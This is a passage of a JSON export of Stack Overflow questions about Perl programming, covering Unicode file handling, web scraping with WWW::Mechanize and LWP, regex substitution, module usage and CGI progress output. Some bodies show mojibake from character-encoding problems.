called at F:/Win7programs/Dwimperl/p\nerl/lib/Tie/File.pm line 210\n        Tie::File::STORE('Tie::File=HASH(0x24cb72c)', 0, 'ÏÎ¹ ÎºÎ¬Î½ÎµÏÎµ;') called at tie file test\n.pl line 31\nutf8 \"\\xD7\" does not map to Unicode at F:/Win7programs/Dwimperl/perl/lib/Tie/File.pm line 917\n        Tie::File::_read_record('Tie::File=HASH(0x24cb72c)') called at F:/Win7programs/Dwimper\nl/perl/lib/Tie/File.pm line 175\n        Tie::File::_fetch('Tie::File=HASH(0x24cb72c)', 0) called at F:/Win7programs/Dwimperl/p\nerl/lib/Tie/File.pm line 210\n        Tie::File::STORE('Tie::File=HASH(0x24cb72c)', 0, 'ÏÎ¹ ÎºÎ¬Î½ÎµÏÎµ;') called at tie file test\n.pl line 31\n</code></pre>\n\n<p>Then it prints this on STDOUT:</p>\n\n<pre><code>0 ÏÎ¹ ÎºÎ¬Î½ÎµÏÎµ;\n1 ÏÎ¬ÏÏÎµ ÏÎ¿ Î® Î±ÏÎ®ÏÏÎµ ÏÎ¿\n2 ×©××× ×××¨××\n3 abc ×× ×××× efg\n4 ××ª× ×××× This is it\n5 ××¢××©×× ××¢××©××\n6 Î£Î®Î¼ÎµÏÎ± ÎµÎ¯Î½Î±Î¹ Î¤ÏÎ¯ÏÎ·\n7 ÎÎ­Î»Ï Î½Î± ÏÎ¬Ï\n8 ÏÎ¹ ÎºÎ¬Î½ÎµÏÎµ;\n9 ×©××¨× ××¡' 5\n10\n11\n12\n13\n14 \\xA4\\xÎÎ­Î»Ï\\xA8\\x\n\n15\n16\n17\n18\n\n19\n</code></pre>\n\n<p>Note that the first 10 lines are OK, but lines 10 through 19 came from nowhere!?\n In addition, the output of the tied file contains corrupted data:</p>\n\n<pre><code> ÏÎ¹ ÎºÎ¬Î½ÏNÍÅÕ ÏÎ®ÏÏÎµ ×©× ×××¨Ø¡bc ×ØÜà Üß e××ª×××× This is ××¢×× ××¢×ØÄÏÝÖÎ½Î±Î¹ Î¤ÏÎÎ­ÏÞÑ ÏÏÅÙ ÎºÏÎµ;×©×¨× ××¡'\n\n\n\n\\xA4\\xÎÎ­Î»Ï\\xA8\\x\n</code></pre>\n\n<p>Something is very wrong here. Either I am missing something, or Tie:File can't cope with Unicode/UTF-8?\nI am running Strawberry Perl 5.14 on a Windows 7 system.</p>\n\n<p>Many TIA - Helen</p>\n\n<p>Note: posted on <a href=\"http://perlmonks.org/?node_id=1002104\" rel=\"nofollow\">http://perlmonks.org/?node_id=1002104</a>, too</p>\n"},{"tags":["regex","perl","www-mechanize"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":32,"score":3,"question_id":13223309,"title":"Trouble following an image link with WWW::Mechanize","body":"<p>I'm working on a Perl script to get the \"astronomy image of the day\" and set it as my wallpaper. Then I would set a cronjob to do that everyday for me. But I'm having a hard time making the script follow the image link that leads to the full-sized image, and only then, download it.\n  I was trying something like that code bellow(have in mind that I'm only a Perl beginner who does not know much about Perl regex):</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse warnings;\nuse WWW::Mechanize;\n\nmy $url = \"http://apod.nasa.gov/apod/astropix.html\";\n\nmy $mech = WWW::Mechanize-&gt;new();\n$mech-&gt;get($url);\n    #debugging\nif ($mech-&gt;follow_link(url_regex=&gt;qr/\\.(?:jpg|png)$/)){\n    print \"Following the image link...\";\n}else{\n    print \"Couldn't find the link...\";\n}\n\nmy @img = $mech-&gt;find_image(alt_regex =&gt; qr/image/i);\n\n    foreach my $img(@img){\n     $mech-&gt;get($img-&gt;url, ':content_file'=&gt;'astro.jpg');\n    }\n\n    print \"\\n\";\n\n    exit(0);\n</code></pre>\n\n<p>Any help would be much appreciated!</p>\n"},{"tags":["javascript","perl","methods","reference"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":623,"score":0,"question_id":9710372,"title":"Unblessed reference in Perl","body":"<p>I have a Perl application that use mode <code>WWW::Scripter</code>. It parse very huge codes and all works great, just one problem occurs that I cannot understand.</p>\n\n<p>I am getting error</p>\n\n<p><strong>Can't call method \"addEventListener\" on unblessed reference \n      at /usr/lib/perl5/site_perl/5.8.8/JE.pm line ...</strong></p>\n\n<p>It looks like an error in <code>JE.pm</code> (JavaScript Engine), which seems to be stable. This JE is called from <code>WWW::Scripter</code>, which seems to be also stable module.</p>\n\n<p>Tracking JavaScript source I realized, that such error sometimes (not always) happens on the following part of JavaScript:</p>\n\n<pre><code>var addEvent=(function(){if(document.addEventListener){...\n</code></pre>\n\n<p>which seems to be correct as well.</p>\n\n<p>Let's take a look at a section of <code>JE.pm</code>, where the error occurs >></p>\n\n<pre><code>        my ($method, $type) = _split_meth $m;\n\n        $proto-&gt;new_method(\n          $name =&gt; defined $type\n            ? $unwrap\n              ? sub {\n                $self-&gt;_cast(\n                  scalar shift-&gt;value-&gt;$method(\n                    $self-&gt;_unwrap(@_)),\n                  $type\n                );\n              }\n              : sub {\n                $self-&gt;_cast(\n                  scalar shift-&gt;value-&gt;$method(@_),\n                  $type\n                );\n              }\n            : $unwrap\n              ? sub { shift-&gt;value-&gt;$m(\n                $self-&gt;_unwrap(@_)) }\n              : sub { shift-&gt;value-&gt;$m(@_) },\n        );\n</code></pre>\n\n<p>and the \"line\", where such error occurs is its bottom part, so >></p>\n\n<pre><code>            : $unwrap\n              ? sub { shift-&gt;value-&gt;$m(\n                $self-&gt;_unwrap(@_)) }\n              : sub { shift-&gt;value-&gt;$m(@_) },\n</code></pre>\n\n<p>So what is wrong? What exactly error <strong>unblessed reference</strong> in this case means?</p>\n"},{"tags":["perl","build","module-build"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13218592,"title":"Module::Build Build issue","body":"<p>What is the output of building a perl module using  <code>Module::build</code>.</p>\n\n<p>I don't know how to make reuse of that. help me to resolve this issue (Again I got the the same code inside <code>blib-&gt;lib</code> directory.</p>\n"},{"tags":["perl","oop","testing","memory"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":62,"score":3,"question_id":13215071,"title":"Patching a class to count number of created objects","body":"<p>I have a Perl library that uses many objects of some (about 3 or 4) classes during its operation.</p>\n\n<p>In testing code, I'd like to ensure it isn't too many (I'm not talking about memory leaks, I know how to check that). To this end, I thought I could count every object used and check the maximum used during the run on the test data. Then, I would compare the obtained number to some guess about how many objects the library should use.</p>\n\n<p>However, I've got problems implementing this. I thought about two possible ways:</p>\n\n<ul>\n<li><p>intercept <code>Package::new</code> and <code>Package::DESTROY</code>. However, this has a little catch that in that package, <code>new</code> doesn't always return a new object. Sometimes, it uses a preexisting one (the objects are used as immutables, so it shouldn't matter much). So I'd have to track each individual object to see if it existed before.</p></li>\n<li><p>intercept <code>Package::bless</code> and <code>Package::DESTROY</code>. This should work, but seems a little unorthodox.</p></li>\n</ul>\n\n<p>The question is, which of those ways is more likely to succeed (maybe what is commonly used in similar situations), and secondly, how would I even implement the second way (would I have to override <code>Package::bless</code> for all packages in question or only base classes etc.).</p>\n"},{"tags":["regex","perl","script","cygwin"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":13220406,"title":"Perl regex substitution not working with global modifier","body":"<p>I have code that looks like the following:</p>\n\n<pre><code>s/([\"\\'])(?:\\\\?+.)*?\\1/(my $x = $&amp;) =~ s|^([\"\\'])(.*src=)([\\'\"])\\/|$1$2$3$1.\\\\$baseUrl.$1\\/|g;$x/ge\n</code></pre>\n\n<p>Ignoring the last bit (and only leaving the part where the problems occur) the code becomes:</p>\n\n<pre><code>s/([\"\\'])(?:\\\\?+.)*?\\1/replace-text-here/g\n</code></pre>\n\n<p>I have tried using both, but I still get the same problem, which is that even though I am using the g modifier, this regex only matches and replaces the first occurrence. If this is a Perl bug, I don't know, but I was using a regex that matches everything between two quotes, and also handles escaped quotes, and I was following <a href=\"http://blog.stevenlevithan.com/archives/match-quoted-string\" rel=\"nofollow\">this blog post</a>. In my eyes, that regex should match everything between the two quotes, then replace it, then try and find another instance of this pattern, because of the g modifier.</p>\n\n<p>For a bit of background information, I am not using and version declarations, and strict and warnings are turned on, yet no warnings have shown up. My script reads an entire file into a scalar (including newlines) then the regex operates directly on that scalar. It does seem to work on each line individually - just not multiple times on one line. Perl version 5.14.2, running on Cygwin 64-bit. It could be that Cygwin (or the Perl port) is messing something up, but I doubt it.</p>\n\n<p>I also tried another example from that blog post, with atomic groups and possessive quantifiers replaced with equivalent code but without those features, but this problem still plagued me.</p>\n\n<p>Examples:</p>\n\n<pre><code>&lt;?php echo ($watched_dir-&gt;getExistsFlag())?\"\":\"&lt;span class='ui-icon-alert'&gt;&lt;img src='/css/images/warning-icon.png'&gt;&lt;/span&gt;\"?&gt;\nShould become (with the shortened regex):\n&lt;?php echo ($watched_dir-&gt;getExistsFlag())?replace-text-here:replace-text-here?&gt;\nYet it only becomes:\n&lt;?php echo ($watched_dir-&gt;getExistsFlag())?replace-text-here:\"&lt;span class='ui-icon-alert'&gt;&lt;img src='/css/images/warning-icon.png'&gt;&lt;/span&gt;\"?&gt;\n\n&lt;?php echo ($sub-&gt;getTarget() != \"\")?\"target=\\\"\".$sub-&gt;getTarget().\"\\\"\":\"\"; ?&gt;\nShould become:\n&lt;?php echo ($sub-&gt;getTarget() != replace-text-here)?replace-text-here.$sub-&gt;getTarget().replace-text-here:replace-text-here; ?&gt;\nAnd as above, only the first occurrence is changed.\n</code></pre>\n\n<p>(And yes, I do realise that this will spark into some sort of - don't use regex for parsing HTML/PHP. But in this case I think that regex is more appropriate, as I am not looking for context, I am looking for a string (anything within quotes) and performing an operation on that string - which is regex.)</p>\n\n<p>And just a note - these regexes are running in an eval function, and the actual regex is encoded in a single quoted string (which is why the single quotes are escaped). I will try any presented solution directly though to rule out my bad programming.</p>\n\n<p>EDIT: As requested, a short script that presents the problems:</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse strict;\n\nmy $data = \"this is the first line, where nothing much happens\nbut on the second line \\\"we suddenly have some double quotes\\\"\nand on the third line there are 'single quotes'\nbut the fourth line has \\\"double quotes\\\" AND 'single quotes', but also another \\\"double quote\\\"\nthe fifth line has the interesting one - \\\"double quoted string 'with embedded singles' AND \\\\\\\"escaped doubles\\\\\\\"\\\"\nand the sixth is just to say - we need a new line at the end to simulate a properly structured file\n\";\nmy $regex = 's/([\"\\'])(?:\\\\?+.)*?\\1/replaced!/g';\nmy $regex2 = 's/([\\'\"]).*?\\1/replaced2!/g';\n\nprint $data.\"\\n\";\n$_ = $data; # to make the regex operate on $_, as per the original script\neval($regex);\nprint $_.\"\\n\";\n$_ = $data;\neval($regex2);\nprint $_; # just an example of an eval, but without the fancy possessive quantifiers\n</code></pre>\n\n<p>This produces the following output for me:</p>\n\n<pre><code>this is the first line, where nothing much happens\nbut on the second line \"we suddenly have some double quotes\"\nand on the third line there are 'single quotes'\nbut the fourth line has \"double quotes\" AND 'single quotes', but also another \"double quote\"\nthe fifth line has the interesting one - \"double quoted string 'with embedded singles' AND \\\"escaped doubles\\\"\"\nand the sixth is just to say - we need a new line at the end to simulate a properly structured file\n\nthis is the first line, where nothing much happens\nbut on the second line \"we suddenly have some double quotes\"\nand on the third line there are 'single quotes'\nbut the fourth line has \"double quotes\" AND 'single quotes', but also another \"double quote\"\nthe fifth line has the interesting one - \"double quoted string 'with embedded singles' AND \\\"escaped doubles\\replaced!\nand the sixth is just to say - we need a new line at the end to simulate a properly structured file\n\nthis is the first line, where nothing much happens\nbut on the second line replaced2!\nand on the third line there are replaced2!\nbut the fourth line has replaced2! AND replaced2!, but also another replaced2!\nthe fifth line has the interesting one - replaced2!escaped doubles\\replaced2!\nand the sixth is just to say - we need a new line at the end to simulate a properly structured file\n</code></pre>\n"},{"tags":["regex","perl"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":13220394,"title":"How to get the first match of a pattern?","body":"<p>How can I get just the c999752_ABC_PAT from the string below?</p>\n\n<pre><code>$file = q(M:\\c999752_ABC_PAT\\Informatica_AVOB\\ABC_infa\\dummy\\TestDeliver.txt);\n</code></pre>\n"},{"tags":["perl","perl-module"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":75,"score":0,"question_id":13219456,"title":"Argument to Perl module use","body":"<p>Having a C background, I may be trying to write something the wrong way so excuse the beginner question. Here is what I'm looking for :</p>\n\n<p>I'm willing to have a perl module <code>Verbose</code> (not a class) that define a subroutine called <code>verbose_print()</code>. This subroutine will print it's argument (a string) only if module's variable <code>$verbose</code> is true. Of course, what I'm willing to do is to get the -V option from the command line (using <code>Getopt::Long</code>) and then, is the -V switch is on, call the <code>Verbose</code> module with 'true' being the value for <code>$Verbose::verbose</code>.</p>\n\n<p>One workaround is to have a <code>verbose_init</code> function that set the <code>$Verbose::verbose</code> variable to true inside the <code>Verbose</code> module. </p>\n\n<p>Another one was to declare <code>$verbose</code> in my module using <code>our</code> and then <code>$Verbose::verbose = $command_line_verbose_switch</code> in the main script.</p>\n\n<p>I was wondering if there is another way to do this in perl? </p>\n"},{"tags":["php","perl","streaming","video-streaming","embedded-video"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13202212,"title":"How do I correctly stream a video file to the web with php or perl","body":"<p>So I am new to perl and web development but I was hoping to get some guidance on the following issue. </p>\n\n<p>Server 1 is transcoding video for me and has an api endpoint for me to access. It will give me the file stream that I want to push to the web. \nSo for the sake of the problem lets say that it is accessed at:</p>\n\n<p>server1:123\\video_stream</p>\n\n<p>Server2 is my web server and I want to have a page that lets us access this video stream file </p>\n\n<p>server2:80\\web_stream </p>\n\n<p>I have seen in php you can do readfile(\"server1:123\\video_stream) but the entire video_stream will be read into memory before being output to the page... or so I was told. </p>\n\n<p>I have also seen in perl that ffmpeg output can but routed through the open(DATA, $ffmpegProcess) then printing the buffer read from this stream to the web_stream page... </p>\n\n<p>This all assumes that the header information about the attributes of the video are correct. </p>\n\n<p>Would it be as simple as making a curl request to Server 1 and returning that stream output like I can already with the ffmpeg output? </p>\n\n<p>I am not looking for complete solution, just some direction on the best and most correct way to do this. Maybe php and perl are not the right tools to handle this at all? </p>\n"},{"tags":["xml","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":33,"score":-2,"question_id":13216630,"title":"Pass perl user input to xml","body":"<p>I have a requirement to make template files based on user input taken from a perl script.</p>\n\n<p>When I run perl program it should ask user input and that value should be used inside xml file.</p>\n\n<p>I know to take user input but don't know how to integrate with xml.</p>\n\n<p>Need your precious suggestions.</p>\n\n<p>Thanks,\nSum</p>\n"},{"tags":["perl","terminal"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":49,"score":2,"question_id":13185696,"title":"perl saving output of command with syntax highlighting","body":"<p>I want to run a command in terminal and capture output so I'm using</p>\n\n<pre><code>my $output = `command`;\n</code></pre>\n\n<p>The problem is the command has syntax highlighting so then I do print later on I loose the syntax highlighting and instead get things such as </p>\n\n<pre><code>print $output; \n</code></pre>\n\n<p>Result</p>\n\n<pre><code> â[31merrorâ[39m â[\n</code></pre>\n\n<p>How can I either get the command without syntax highlighting or somehow get the syntax highlighting to display on print.</p>\n"},{"tags":["perl","winapi","ppm"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":2772,"score":-2,"question_id":2092784,"title":"How can I properly install Win32::GuiTest?","body":"<p>I am trying to use <a href=\"http://search.cpan.org/perldoc/Win32%3A%3AGuiTest\" rel=\"nofollow\">Win32::GuiTest</a> and with Windows XP and <code>perl</code> version 5.8.6.</p>\n\n<p>I am getting the following error:</p>\n\n<pre>\nCan't locate loadable object for module Win32::GuiTest in @INC (@INC contains: \nC:/Perl/lib C:/Perl/site/lib .) at E:\\a\\simply.pl line 259\n  Compilation failed in require at E:\\a\\simply.pl line 259.\n  BEGIN failed--compilation aborted at E:\\a\\simply.pl line 259\n</pre>\n\n<p>I tried following the instructions for <a href=\"http://search.cpan.org/dist/Win32-GuiTest-1.3/\" rel=\"nofollow\">Win32-GuiTest-1.3</a>. I tried to install:</p>\n\n<p>I created <code>C:\\TEMP</code> and I downloaded the zip file and extracted  the contents and placed in <code>C:\\TEMP</code> and gave the command</p>\n\n<pre><code>C:\\TEMP&gt;ppm\nppm&gt; install C:\\temp\\win32-guitest.ppd\n</code></pre>\n\n<p>It is giving an error as...</p>\n\n<pre>\nError: no suitable installation target found for package Win32-GuiTest.\n</pre>\n\n<p>If I use the package <code>Win32-GuiTest-1.56</code>, it is giving the error</p>\n\n<pre>\nError: Package 'win32-guitest' not found. Please 'search' for it first.\n</pre>\n\n<p>and if i use the command</p>\n\n<pre>\nC:\\temp>ppm\nppm> install Win32::GuiTest\n</pre>\n\n<p>i get the error as...</p>\n\n<pre>\nError: No valid repositories:\nError: 501 Protocol scheme '' is not supported\nError: 501 Protocol scheme '' is not supported\n</pre>\n\n<p>i downloaded from \n<strong>http://search.cpan.org/~erngui/Win32-GuiTest-1.3/GuiTest.pm</strong> for package <code>Win32-GuiTest-1.3</code>\nand \n<strong>http://search.cpan.org/dist/Win32-GuiTest/lib/Win32/GuiTest.pm</strong> for package <code>Win32-GuiTest-1.56</code></p>\n"},{"tags":["perl","encoding","iso-8859-1","lwp-useragent"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":13214961,"title":"Perl - right way to retrieve a ISO-8859-1 encoded website with LWP::UserAgent?","body":"<p>I am retrieving a Â´ISO-8859-1Â´ encoded website by using Â´LWP::UserAgentÂ´ with the following code. </p>\n\n<p>The problem is, that the special characters are not displayed right, especialy the \"â¬\" sign is displayed wrong. </p>\n\n<p>The content encoding is recognized as Â´ISO-8859-1Â´, which is right.</p>\n\n<p>To display the retrieved text I am saving it into a file and open it with Notepag++.</p>\n\n<p><strong>Question:</strong> How can I retrieve Â´ISO-8859-1Â´ encoded special characters, in the right way?</p>\n\n<pre>\n<code>\n#SENDING REQUEST\nmy $ua = LWP::UserAgent->new();\n$ua->agent('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1'); # pretend we are very capable browser\n\nmy $req = HTTP::Request->new(GET => $url);\n\n#add some header fields\n$req->header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');\n$req->header('Accept-Language', 'en;q=0.5');\n$req->header('Connection', 'keep-alive');\n$req->header('Host', 'www.url.com');\n\n#SEND\nmy $response = $ua->request($req);\n\n#decode  trial1\nprint $response->content_charset(); # gives ISO-8859-1 which is right\nmy $content  = $response->decoded_content(); #special chars are displayed wrong\n\n#decode trial2\nmy $decContent =  decode('ISO-8859-1', $response->content());\nmy $utf8Content = encode( 'utf-8', $decContent ); #special char â¬ is displayed as Ã\n\n#decode trial3\nEncode::from_to($content, 'iso-8859-1', 'utf8'); #special char â¬ is displayed as Ã too\n\n\n#example on writing data to file\nopen(MYOUTFILE, \">>D:\\\\encodingperl.html\"); #open for write, overwrite\nprint MYOUTFILE \"$utf8Content\"; #write text\nclose(MYOUTFILE);\n\n</code>\n</pre>\n"},{"tags":["perl","foreach","key"],"answer_count":5,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":765,"score":2,"question_id":2431637,"title":"Changing keys in a \"for ( keys %hash ) {}\"-loop","body":"<p>I remember something about not changing the keys in a</p>\n\n<pre><code>for my $key ( keys %hash ) { ...\n</code></pre>\n\n<p>for example</p>\n\n<pre><code>for my $key ( keys %hash ) {\n    $key = \"$key_x\";\n}\n</code></pre>\n\n<p>But deleting keys and changing values would be fine.\nAre my memories OK? </p>\n"},{"tags":["html","perl","cgi"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":13212172,"title":"Display real live progress in perl","body":"<p>I have this code in cgi.</p>\n\n<pre><code>#!/usr/bin/perl\nprint \"content-type: text/html \\n\\n\";\nprint \"&lt;html&gt;&lt;head&gt;&lt;style&gt;div.section{  font-size: 12px;    border: 1px solid #999999;  background-color: #EFEFEF;  margin: 10px 15px;}p{   font-family: \\\"Arial\\\", \\\"Helvetica\\\", \\\"sans-serif\\\";  font-size: 14px;    color: #444444; line-height: 30px;  margin: 0 10px 0 10px;  padding: 0 0 6px 0; text-align: center;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=\\\"section\\\"&gt;&lt;p&gt;\";\nprint \"&lt;b&gt;YAMJ successfully updated your movie collection&lt;/b&gt;\";\nprint \"&lt;/p&gt;&lt;b&gt;YAMJ output:&lt;/b&gt;&lt;br&gt;\";\nprint \"&lt;pre&gt;\";\nmy $status = system(\"/usr/local/YAMJ/run.sh\");\nprint \"&lt;/pre&gt;\";\nprint \"&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;\";\n</code></pre>\n\n<p>The code was created by MissileHugger for YAMJ in Synology. The thing is each time user open the app on synology, it just gives you blank page while the script do its thing.</p>\n\n<p>I was wondering, is there a way to output real time data progress of what the script is doing at that time? Similar to when we install windows software, there is status showing what file being copied etc.</p>\n\n<p>Anyone has any idea if I can do this?</p>\n\n<p>Sorry for my poor english.</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":13211397,"title":"Transform data to array with Perl","body":"<p>How do I transform my data to an array with Perl?</p>\n\n<p>Here is my data:</p>\n\n<pre><code>my $data =\n  \"203.174.38.128203.174.38.129203.174.38.1\" .\n  \"30203.174.38.131203.174.38.132203.174.38\" .\n  \".133203.174.38.134173.174.38.135203.174.\" .\n  \"38.136203.174.38.137203.174.38.142\";\n</code></pre>\n\n<p>And I want to transform it to be array like this</p>\n\n<pre><code>my @array= (\n  \"203.174.38.128\",\n  \"203.174.38.129\",\n  \"203.174.38.130\",\n  \"203.174.38.131\",\n  \"203.174.38.132\",\n  \"203.174.38.133\",\n  \"203.174.38.134\",\n  \"173.174.38.135\",\n  \"203.174.38.136\",\n  \"203.174.38.137\",\n  \"203.174.38.142\"\n);\n</code></pre>\n\n<p>Anyone know how to do that with Perl?</p>\n"},{"tags":["python","perl","shell"],"answer_count":7,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":496,"score":4,"question_id":3009832,"title":"Randomly selecting lines from files","body":"<p>I have bunch of files and very file has a header of 5 lines. In the rest of the file, pair of line form an entry. I need to randomly select entry from these files. \nHow can i select random files and random entry(pair of line, excluding header) ? </p>\n"},{"tags":["javascript","perl","scheduled-tasks"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13213110,"title":"working with filenames and scheduled function calls in javascript","body":"<p>I have a couple questions about javascript:</p>\n\n<ol>\n<li>Does javascript have the capability to identify a filename with a timestamp as a name?</li>\n</ol>\n\n<p>Similar to the Perl code below utilizing the POSIX module?</p>\n\n<pre><code>my $filepath = sprintf(\"/path/to/file%s.JSON\",strftime(\"%y%m%d\",localtime));\n</code></pre>\n\n<p>this is just an example. I would like to find file in format <code>yy/mm/dd/hh/min</code></p>\n\n<p>For example say I want to find a file with the name <code>12_11_03_15:15.json</code> how can I do this with javascript.</p>\n\n<ol>\n<li>Say I create a function that I want to trigger every 15 minutes to read the file how is this possible with javascript? I looked at <code>setInterval()</code> but that won't work because it is dependent on when the browser is launched. Is it possible to schedule a function to execute every hh:00, hh:15, hh:30, hh:45?</li>\n</ol>\n\n<p>Thank you very much in advance.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":1,"up_vote_count":5,"down_vote_count":1,"view_count":180,"score":4,"question_id":7099880,"title":"perl efficient code","body":"<p>for the sake of becoming a better scripter, is there a way to make the following code in less lines? </p>\n\n<pre><code>sub task1_2_2 {\n  #Make sure syslog configuration is correct\n  my @r3r = my @r4r = my @r5r = my @r6r = my @r7r = my @r8r = (\"name = 67.176.10.200\",\"facility-override = local3\");\n  my @r1r = (\"name = 67.176.10.200\",\"facility-override = local3\",\"source-address = 67.176.255.1\");\n  my @r2r = (\"name = 67.176.10.200\",\"facility-override = local3\",\"source-address = 67.176.255.2\");\n  my (@r1,@r2,@r3,@r4,@r5,@r6,@r7,@r8,%seen,@result1,@result2,@result3,@result4,@result5,@result6,@result7,@result8,$results,$item,$ii);\n  my $pass = \"pass\";\n  my $xinfo = shift;\n  my $ip = shift;\n  my $data = XML::LibXML-&gt;load_xml(string =&gt; $xinfo);\n  my $datax = XML::LibXML::XPathContext-&gt;new($data);\n  my $syspath = '/configuration/system/syslog/host/*';\n  foreach ($datax-&gt;findnodes($syspath)) {\n    if($ip eq \"67.176.10.2\" &amp;&amp; $_-&gt;getName() ne \"contents\") {my $v = join \" = \",$_-&gt;getName(),$_-&gt;to_literal;push @r1,$v};\n    if($ip eq \"67.176.10.3\" &amp;&amp; $_-&gt;getName() ne \"contents\") {my $v = join \" = \",$_-&gt;getName(),$_-&gt;to_literal;push @r2,$v};\n    if($ip eq \"67.176.10.4\" &amp;&amp; $_-&gt;getName() ne \"contents\") {my $v = join \" = \",$_-&gt;getName(),$_-&gt;to_literal;push @r3,$v};\n    if($ip eq \"67.176.10.5\" &amp;&amp; $_-&gt;getName() ne \"contents\") {my $v = join \" = \",$_-&gt;getName(),$_-&gt;to_literal;push @r4,$v};\n    if($ip eq \"67.176.10.6\" &amp;&amp; $_-&gt;getName() ne \"contents\") {my $v = join \" = \",$_-&gt;getName(),$_-&gt;to_literal;push @r5,$v};\n    if($ip eq \"67.176.10.7\" &amp;&amp; $_-&gt;getName() ne \"contents\") {my $v = join \" = \",$_-&gt;getName(),$_-&gt;to_literal;push @r6,$v};\n    if($ip eq \"67.176.10.8\" &amp;&amp; $_-&gt;getName() ne \"contents\") {my $v = join \" = \",$_-&gt;getName(),$_-&gt;to_literal;push @r7,$v};\n    if($ip eq \"67.176.10.9\" &amp;&amp; $_-&gt;getName() ne \"contents\") {my $v = join \" = \",$_-&gt;getName(),$_-&gt;to_literal;push @r8,$v};\n  }\n  @seen{@r1} = ( ); if($ip eq \"67.176.10.2\") {foreach $item (@r1r) { push(@result1, $item) unless exists $seen{$item}; }}\n  if(@result1) {\n              foreach $ii (@result1) {$results .= \"On R1 Syslog $ii ,is either missing or incorrect configuration was done\\n\";}\n              }\n  %seen=();\n  $item=$ii = undef; \n  @seen{@r2} = ( ); if($ip eq \"67.176.10.3\") {foreach $item (@r2r) { push(@result2, $item) unless exists $seen{$item}; }}\n  if(@result2) {\n              foreach $ii (@result2) {$results .= \"On R2 Syslog $ii ,is either missing or incorrect configuration was done\\n\";}\n              }\n  %seen=();\n  $item=$ii = undef; \n  @seen{@r3} = ( ); if($ip eq \"67.176.10.4\") {foreach $item (@r3r) { push(@result3, $item) unless exists $seen{$item}; }}\n  if(@result3) {\n              foreach $ii (@result3) {$results .= \"On R3 Syslog $ii ,is either missing or incorrect configuration was done\\n\";}\n              }\n  %seen=();\n  $item=$ii = undef; \n  @seen{@r4} = ( ); if($ip eq \"67.176.10.5\") {foreach $item (@r4r) { push(@result4, $item) unless exists $seen{$item}; }}\n  if(@result4) {\n              foreach $ii (@result4) {$results .= \"On R4 Syslog $ii ,is either missing or incorrect configuration was done\\n\";}\n              }\n  %seen=();\n  $item=$ii = undef; \n  @seen{@r5} = ( ); if($ip eq \"67.176.10.6\") {foreach $item (@r5r) { push(@result5, $item) unless exists $seen{$item}; }}\n  if(@result5) {\n              foreach $ii (@result5) {$results .= \"On R5 Syslog $ii ,is either missing or incorrect configuration was done\\n\";}\n              }\n  %seen=();\n  $item=$ii = undef; \n  @seen{@r6} = ( ); if($ip eq \"67.176.10.7\") {foreach $item (@r6r) { push(@result6, $item) unless exists $seen{$item}; }}\n  if(@result6) {\n              foreach $ii (@result6) {$results .= \"On R6 Syslog $ii ,is either missing or incorrect configuration was done\\n\";}\n              }\n  %seen=();\n  $item=$ii = undef; \n  @seen{@r7} = ( ); if($ip eq \"67.176.10.8\") {foreach $item (@r7r) { push(@result7, $item) unless exists $seen{$item}; }}\n  if(@result7) {\n              foreach $ii (@result7) {$results .= \"On R7 Syslog $ii ,is either missing or incorrect configuration was done\\n\";}\n              }\n  %seen=();\n  $item=$ii = undef; \n  @seen{@r8} = ( ); if($ip eq \"67.176.10.9\") {foreach $item (@r8r) { push(@result8, $item) unless exists $seen{$item}; }}\n  if(@result8) {\n              foreach $ii (@result8) {$results .= \"On R8 Syslog $ii ,is either missing or incorrect configuration was done\\n\";}\n              }\n  if($results) { return $results; } elsif(!$results) { return $pass }\n}  \n</code></pre>\n\n<p>I am going to be writing a lot of these subroutines. \nBasically I am running this subroutine through a loop of routers and if something doesn't match what I am expecting I want to return back what router is incorrect and what is missing. The code works, but it feels very verbose as I haven't been coding for very long. \nThanks in advance for any feedback. </p>\n"},{"tags":["linux","perl","debugging"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":46,"score":3,"question_id":13211060,"title":"How to use perl debugger's *supported* editor?","body":"<p><code>perl</code> debugger always say: \"Editor support available\", I believe every one can see this, <em>BUT</em> how to use it?</p>\n\n<pre><code>my-computer$perl -de2\n\nLoading DB routines from perl5db.pl version 1.33\nEditor support available.\n\nEnter h or `h h' for help, or `man perldebug' for more help.\n\nmain::(-e:1):   2\n  DB&lt;1&gt; \n</code></pre>\n\n<p>By the way, I got the above prompt on the Linux/ubuntu natty 